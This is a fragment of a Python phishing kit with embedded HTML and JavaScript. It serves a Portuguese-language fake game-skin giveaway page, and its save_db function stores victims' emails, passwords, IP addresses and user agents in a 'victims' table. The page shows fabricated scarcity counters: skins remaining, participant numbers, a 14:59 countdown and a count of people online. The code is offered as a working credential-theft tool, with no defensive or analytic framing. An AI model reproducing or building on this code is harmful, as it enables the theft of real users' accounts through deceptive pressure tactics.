#!/usr/bin/env python3
import secrets, json, datetime, random, time, requests, os, sqlite3, re, threading
...
def save_db(data):
    with sqlite3.connect('captured.db') as conn:
        conn.execute('''INSERT INTO victims (timestamp, email, password, ip, user_agent, click_count)
                       VALUES (?,?,?,?,?,?)''',
                     (data['timestamp'], data['email'], data['password'], data['ip'],
                      data['user_agent'], data.get('click_count',0)))
        conn.commit()
...
<div class="container">
    ...
    <div class="scarcity-box">
        <div class="scarcity-row"><span>🎁 Skins disponíveis:</span><span class="scarcity-value" id="skinsLeft">''' + str(skins_restantes) + '''</span></div>
        <div class="scarcity-row"><span>👥 Participantes do sorteio:</span><span class="scarcity-value" id="participants">''' + str(participantes) + '''</span></div>
        <div class="scarcity-row"><span>⏰ Oferta expira em:</span><span class="scarcity-value timer" id="timer">14:59</span></div>
        <div class="scarcity-row"><span>👀 Pessoas online agora:</span><span class="scarcity-value live-counter" id="onlineCount">''' + str(online_agora) + '''</span></div>
    </div>
...
<script>
var sessionId = "''' + sid + '''";
var skinsLeft = ''' + str(skins_restantes) + ''';
var participants = ''' + str(participantes) + ''';
var onlineVisitors = ''' + str(online_agora) + ''';
